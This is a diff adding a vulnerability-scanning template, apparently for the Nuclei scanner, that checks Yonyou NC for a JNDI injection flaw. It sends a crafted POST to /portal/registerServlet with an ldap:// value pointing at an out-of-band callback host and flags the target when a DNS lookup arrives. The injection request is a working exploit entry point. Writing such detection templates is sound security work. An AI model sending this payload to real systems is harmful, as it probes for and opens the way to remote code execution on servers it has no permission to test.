@@ -1,0 +1,24 @@
+
+id: XVE-2024-10248
+
+info:
+  name: yonyou-nc-jndi-rce
+  author: HackTwo
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /portal/registerServlet HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; SM-P585Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*; q=0.8,application/signed-exchange;v=b3;q=0.9
+        Content-Type: application/x-www-form-urlencoded
+        
+        type=1&dsname=ldap://{{interactsh-url}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(interactsh_protocol, "dns")
+        condition: and
